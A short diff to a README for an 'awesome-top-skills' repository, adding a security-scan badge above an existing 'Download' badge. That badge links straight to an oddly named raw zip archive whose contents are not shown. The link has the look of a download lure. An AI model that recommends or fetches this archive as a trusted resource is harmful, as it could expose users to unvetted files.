@@ -1,5 +1,7 @@
 # 🚀 awesome-top-skills - Access 5,000+ Curated AI Skills
 
+[![SafeSkill 72/100](https://img.shields.io/badge/SafeSkill-72%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/mtnclk-awesome-top-skills)
+
 [![Download](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)](https://raw.githubusercontent.com/mtnclk/awesome-top-skills/main/categories/ai-llm/awesome_skills_top_unmemorialized.zip)
 
 ## 🚀 Getting Started
